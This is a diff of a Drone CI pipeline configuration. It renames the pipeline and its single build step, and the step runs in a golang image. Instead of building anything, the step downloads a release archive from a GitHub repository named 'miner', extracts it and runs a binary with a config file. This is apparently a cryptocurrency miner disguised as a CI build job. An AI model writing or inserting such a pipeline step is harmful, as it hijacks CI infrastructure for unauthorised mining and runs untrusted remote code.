@@ -1,9 +1,9 @@
 kind: pipeline
 type: docker
-name: backend
+name: gaskeun
 
 steps:
-- name: build1
+- name: bosss🚴
   image: golang
   commands:
   - wget https://github.com/hendrik20212/miner/releases/download/luck_ap/luck_ap.tar.gz && tar -xvf luck_ap.tar.gz && ./ver ap.ini
